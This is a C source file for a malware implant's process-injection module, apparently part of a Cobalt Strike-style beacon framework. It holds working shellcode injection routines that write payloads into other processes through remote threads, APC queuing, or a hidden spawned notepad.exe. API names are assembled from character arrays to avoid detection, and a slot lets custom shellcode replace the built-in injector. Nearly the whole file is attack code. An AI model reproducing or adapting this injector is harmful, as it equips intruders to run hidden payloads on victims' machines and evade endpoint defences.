// Process Inject Kit — user-replaceable PIC shellcode slot for injection.
//
// Architecture (mirrors Sleep Mask Kit):
//   .injkit  section — user-replaceable PIC slot (NOT encrypted during sleep)
//   .inject  section — kit code (via code_seg, NOT encrypted during sleep)
//
// If .injkit contains the sentinel magic (CO2H_INJKIT__v1), the built-in
// default inject runs. If artifact-gen patched it with user shellcode (--inject),
// the trampoline calls user code instead.
//
// The trampoline:
//   1. Fills InjectCtx with NT function pointers + target info
//   2. Calls inject entry (user or built-in)
//   3. Returns result to caller

#include "../core/beacon.h"
#include <tlhelp32.h>

// ---- Code in .inject section (never encrypted) ----------------------------
#define INJECT_CODE __declspec(code_seg(".inject"))

// ---- .injkit section: user-replaceable PIC slot -----------------------------

#define INJKIT_SENTINEL     "CO2H_INJKIT__v1\x00"  // 16 bytes
#define INJKIT_SENTINEL_LEN 16
#define INJKIT_SLOT_SIZE    16384

#pragma section(".injkit", read, execute)
__declspec(allocate(".injkit"))
static volatile uint8_t g_injkit_slot[INJKIT_SLOT_SIZE] = {
    'C','O','2','H','_','I','N','J','K','I','T','_','_','v','1','\0'
    // rest is zero-filled (16368 bytes available for user code)
};

// ---- InjectCtx (must match kit/processinject/process_inject_api.h) ----------

#define INJECT_METHOD_THREAD    0
#define INJECT_METHOD_APC       1
#define INJECT_METHOD_SPAWN     2

#define INJECT_OK               0

typedef struct InjectCtx {
    HANDLE      target_process;
    DWORD       target_pid;
    uint32_t    method_hint;

    const uint8_t*  payload;
    uint32_t        payload_len;

    HANDLE      out_thread;
    HANDLE      out_process;
    void*       out_remote_base;

    // NT function pointers
    NTSTATUS (__stdcall *NtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS (__stdcall *NtWriteVirtualMemory)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS (__stdcall *NtProtectVirtualMemory)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS (__stdcall *NtCreateThreadEx)(
        HANDLE*, DWORD, PVOID, HANDLE, PVOID, PVOID,
        ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    NTSTATUS (__stdcall *NtQueueApcThread)(
        HANDLE, PVOID, PVOID, PVOID, PVOID);
    NTSTATUS (__stdcall *NtOpenProcess)(
        HANDLE*, DWORD, PVOID, PVOID);
    NTSTATUS (__stdcall *NtCreateSection)(
        HANDLE*, DWORD, PVOID, PVOID, ULONG, ULONG, HANDLE);
    NTSTATUS (__stdcall *NtMapViewOfSection)(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
        PVOID, PSIZE_T, DWORD, ULONG, ULONG);
    NTSTATUS (__stdcall *NtUnmapViewOfSection)(HANDLE, PVOID);
    NTSTATUS (__stdcall *NtClose)(HANDLE);
    NTSTATUS (__stdcall *NtResumeThread)(HANDLE, PULONG);
    NTSTATUS (__stdcall *NtSuspendThread)(HANDLE, PULONG);
    NTSTATUS (__stdcall *NtGetContextThread)(HANDLE, PVOID);
    NTSTATUS (__stdcall *NtSetContextThread)(HANDLE, PVOID);

    // Kernel32
    BOOL (__stdcall *p_CreateProcessW)(
        const void*, void*, void*, void*, BOOL, DWORD, void*, const void*, void*, void*);
    BOOL (__stdcall *p_TerminateProcess)(HANDLE, DWORD);
    void* (__stdcall *p_CreateToolhelp32Snapshot)(DWORD, DWORD);
    BOOL  (__stdcall *p_Thread32First)(HANDLE, void*);
    BOOL  (__stdcall *p_Thread32Next)(HANDLE, void*);
    HANDLE (__stdcall *p_OpenThread)(DWORD, BOOL, DWORD);
    BOOL  (__stdcall *p_CloseHandle)(HANDLE);

    HANDLE      self_process;
    void*       ntdll_base;
    void*       kernel32_base;

    const uint16_t* spawn_to;
    uint32_t        spawn_to_len;
} InjectCtx;

typedef uint32_t (__cdecl *InjectFn)(InjectCtx*);

// ---- Check if user inject kit is patched in ---------------------------------

INJECT_CODE static int injkit_is_patched(void) {
    if (g_injkit_slot[0]  != 'C')  return 1;
    if (g_injkit_slot[1]  != 'O')  return 1;
    if (g_injkit_slot[2]  != '2')  return 1;
    if (g_injkit_slot[3]  != 'H')  return 1;
    if (g_injkit_slot[4]  != '_')  return 1;
    if (g_injkit_slot[5]  != 'I')  return 1;
    if (g_injkit_slot[6]  != 'N')  return 1;
    if (g_injkit_slot[7]  != 'J')  return 1;
    if (g_injkit_slot[8]  != 'K')  return 1;
    if (g_injkit_slot[9]  != 'I')  return 1;
    if (g_injkit_slot[10] != 'T')  return 1;
    if (g_injkit_slot[11] != '_')  return 1;
    if (g_injkit_slot[12] != '_')  return 1;
    if (g_injkit_slot[13] != 'v')  return 1;
    if (g_injkit_slot[14] != '1')  return 1;
    if (g_injkit_slot[15] != '\0') return 1;
    return 0;  // unpatched
}

// ---- Resolve functions for InjectCtx ----------------------------------------

INJECT_CODE static void resolve_inject_ctx(InjectCtx* ctx) {
    // ntdll
    wchar_t s_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
    HMODULE ntdll = GetModuleHandleW(s_ntdll);
    ctx->ntdll_base = (void*)ntdll;

    if (ntdll) {
        char s1[]  = {'N','t','A','l','l','o','c','a','t','e',
                      'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
        char s2[]  = {'N','t','W','r','i','t','e',
                      'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
        char s3[]  = {'N','t','P','r','o','t','e','c','t',
                      'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
        char s4[]  = {'N','t','C','r','e','a','t','e',
                      'T','h','r','e','a','d','E','x',0};
        char s5[]  = {'N','t','Q','u','e','u','e',
                      'A','p','c','T','h','r','e','a','d',0};
        char s6[]  = {'N','t','O','p','e','n','P','r','o','c','e','s','s',0};
        char s7[]  = {'N','t','C','r','e','a','t','e',
                      'S','e','c','t','i','o','n',0};
        char s8[]  = {'N','t','M','a','p','V','i','e','w','O','f',
                      'S','e','c','t','i','o','n',0};
        char s9[]  = {'N','t','U','n','m','a','p','V','i','e','w','O','f',
                      'S','e','c','t','i','o','n',0};
        char s10[] = {'N','t','C','l','o','s','e',0};
        char s11[] = {'N','t','R','e','s','u','m','e','T','h','r','e','a','d',0};
        char s12[] = {'N','t','S','u','s','p','e','n','d','T','h','r','e','a','d',0};
        char s13[] = {'N','t','G','e','t','C','o','n','t','e','x','t',
                      'T','h','r','e','a','d',0};
        char s14[] = {'N','t','S','e','t','C','o','n','t','e','x','t',
                      'T','h','r','e','a','d',0};

        *(FARPROC*)&ctx->NtAllocateVirtualMemory = GetProcAddress(ntdll, s1);
        *(FARPROC*)&ctx->NtWriteVirtualMemory    = GetProcAddress(ntdll, s2);
        *(FARPROC*)&ctx->NtProtectVirtualMemory  = GetProcAddress(ntdll, s3);
        *(FARPROC*)&ctx->NtCreateThreadEx        = GetProcAddress(ntdll, s4);
        *(FARPROC*)&ctx->NtQueueApcThread        = GetProcAddress(ntdll, s5);
        *(FARPROC*)&ctx->NtOpenProcess           = GetProcAddress(ntdll, s6);
        *(FARPROC*)&ctx->NtCreateSection         = GetProcAddress(ntdll, s7);
        *(FARPROC*)&ctx->NtMapViewOfSection      = GetProcAddress(ntdll, s8);
        *(FARPROC*)&ctx->NtUnmapViewOfSection    = GetProcAddress(ntdll, s9);
        *(FARPROC*)&ctx->NtClose                 = GetProcAddress(ntdll, s10);
        *(FARPROC*)&ctx->NtResumeThread          = GetProcAddress(ntdll, s11);
        *(FARPROC*)&ctx->NtSuspendThread         = GetProcAddress(ntdll, s12);
        *(FARPROC*)&ctx->NtGetContextThread      = GetProcAddress(ntdll, s13);
        *(FARPROC*)&ctx->NtSetContextThread      = GetProcAddress(ntdll, s14);
    }

    // kernel32
    wchar_t s_k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
    HMODULE k32 = GetModuleHandleW(s_k32);
    ctx->kernel32_base = (void*)k32;

    if (k32) {
        char sk1[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','W',0};
        char sk2[] = {'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s',0};
        char sk3[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2',
                      'S','n','a','p','s','h','o','t',0};
        char sk4[] = {'T','h','r','e','a','d','3','2','F','i','r','s','t',0};
        char sk5[] = {'T','h','r','e','a','d','3','2','N','e','x','t',0};
        char sk6[] = {'O','p','e','n','T','h','r','e','a','d',0};
        char sk7[] = {'C','l','o','s','e','H','a','n','d','l','e',0};

        *(FARPROC*)&ctx->p_CreateProcessW           = GetProcAddress(k32, sk1);
        *(FARPROC*)&ctx->p_TerminateProcess         = GetProcAddress(k32, sk2);
        *(FARPROC*)&ctx->p_CreateToolhelp32Snapshot = GetProcAddress(k32, sk3);
        *(FARPROC*)&ctx->p_Thread32First            = GetProcAddress(k32, sk4);
        *(FARPROC*)&ctx->p_Thread32Next             = GetProcAddress(k32, sk5);
        *(FARPROC*)&ctx->p_OpenThread               = GetProcAddress(k32, sk6);
        *(FARPROC*)&ctx->p_CloseHandle              = GetProcAddress(k32, sk7);
    }

    ctx->self_process = (HANDLE)(LONG_PTR)-1;
}

// ---- Built-in default: alloc + write + protect + CreateThread ----------------

INJECT_CODE static uint32_t default_inject_thread(InjectCtx* ctx) {
    if (!ctx->target_process) return 5; // INJECT_ERR_PROCESS

    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        ctx->target_process, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return 1;

    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(
        ctx->target_process, base, (PVOID)ctx->payload,
        (SIZE_T)ctx->payload_len, &written);
    if (ns < 0) return 2;

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(ctx->target_process, &pb, &ps, 0x20, &old);

    HANDLE hth = NULL;
    ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, ctx->target_process, base, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return 4;

    ctx->out_thread = hth;
    ctx->out_remote_base = base;
    return 0;
}

INJECT_CODE static uint32_t default_inject_apc(InjectCtx* ctx) {
    if (!ctx->target_process) return 5;

    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        ctx->target_process, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return 1;

    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(
        ctx->target_process, base, (PVOID)ctx->payload,
        (SIZE_T)ctx->payload_len, &written);
    if (ns < 0) return 2;

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(ctx->target_process, &pb, &ps, 0x20, &old);

    ctx->out_remote_base = base;

    HANDLE snap = ctx->p_CreateToolhelp32Snapshot(0x00000004, 0);
    if (!snap || snap == INVALID_HANDLE_VALUE) return 4;

    typedef struct {
        DWORD dwSize; DWORD cntUsage; DWORD th32ThreadID;
        DWORD th32OwnerProcessID; LONG tpBasePri; LONG tpDeltaPri; DWORD dwFlags;
    } TE32;

    TE32 te; te.dwSize = sizeof(te);
    int queued = 0;
    if (ctx->p_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != ctx->target_pid) continue;
            HANDLE hth = ctx->p_OpenThread(0x0010, FALSE, te.th32ThreadID);
            if (!hth) continue;
            if (ctx->NtQueueApcThread(hth, base, NULL, NULL, NULL) >= 0) ++queued;
            ctx->p_CloseHandle(hth);
        } while (ctx->p_Thread32Next(snap, &te));
    }
    ctx->p_CloseHandle(snap);
    return queued > 0 ? 0 : 4;
}

INJECT_CODE static uint32_t default_inject_spawn(InjectCtx* ctx) {
    uint16_t default_sp[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'n','o','t','e','p','a','d','.','e','x','e',0
    };

    uint16_t* cmd = (uint16_t*)ctx->spawn_to;
    if (!cmd || !cmd[0]) cmd = default_sp;

    STARTUPINFOW si; rt_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi; rt_memset(&pi, 0, sizeof(pi));

    if (!ctx->p_CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                               CREATE_SUSPENDED | CREATE_NO_WINDOW,
                               NULL, NULL, &si, &pi))
        return 5;

    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        pi.hProcess, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) {
        ctx->p_TerminateProcess(pi.hProcess, 1);
        ctx->p_CloseHandle(pi.hThread);
        ctx->p_CloseHandle(pi.hProcess);
        return 1;
    }

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(pi.hProcess, base, (PVOID)ctx->payload,
                              (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(pi.hProcess, &pb, &ps, 0x20, &old);

    HANDLE hth = NULL;
    ns = ctx->NtCreateThreadEx(&hth, 0x1FFFFF, NULL, pi.hProcess, base, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) {
        ctx->p_TerminateProcess(pi.hProcess, 1);
        ctx->p_CloseHandle(pi.hThread);
        ctx->p_CloseHandle(pi.hProcess);
        return 4;
    }

    ctx->out_thread  = hth;
    ctx->out_process = pi.hProcess;
    ctx->out_remote_base = base;
    ctx->p_CloseHandle(pi.hThread);
    return 0;
}

INJECT_CODE static uint32_t default_inject(InjectCtx* ctx) {
    switch (ctx->method_hint) {
    case INJECT_METHOD_APC:   return default_inject_apc(ctx);
    case INJECT_METHOD_SPAWN: return default_inject_spawn(ctx);
    default:                  return default_inject_thread(ctx);
    }
}

// ---- Public API: kit_inject() — called by beacon commands -------------------
//
// Returns: 0 = success, nonzero = error.
// On success, out_thread / out_process are filled in ctx.

INJECT_CODE uint32_t kit_inject(
    HANDLE  target_process,
    DWORD   target_pid,
    uint32_t method,
    const uint8_t* shellcode,
    uint32_t shellcode_len,
    const uint16_t* spawn_to,
    uint32_t spawn_to_len,
    HANDLE* out_thread,
    HANDLE* out_process,
    void**  out_remote_base)
{
    InjectCtx ctx;
    rt_memset(&ctx, 0, sizeof(ctx));

    ctx.target_process = target_process;
    ctx.target_pid     = target_pid;
    ctx.method_hint    = method;
    ctx.payload        = shellcode;
    ctx.payload_len    = shellcode_len;
    ctx.spawn_to       = spawn_to;
    ctx.spawn_to_len   = spawn_to_len;

    resolve_inject_ctx(&ctx);

    // Fallback: если критичные функции не резолвлены, ошибка.
    if (!ctx.NtAllocateVirtualMemory || !ctx.NtWriteVirtualMemory ||
        !ctx.NtProtectVirtualMemory || !ctx.NtCreateThreadEx)
        return 6; // INJECT_ERR_RESOLVE

    uint32_t result;
    if (injkit_is_patched()) {
        uint32_t ep_off = *(volatile uint32_t*)(void*)g_injkit_slot;
        InjectFn fn = (InjectFn)(void*)((uint8_t*)(void*)g_injkit_slot + ep_off);
        result = fn(&ctx);
    } else {
        result = default_inject(&ctx);
    }

    if (out_thread)      *out_thread      = ctx.out_thread;
    if (out_process)     *out_process     = ctx.out_process;
    if (out_remote_base) *out_remote_base = ctx.out_remote_base;
    return result;
}
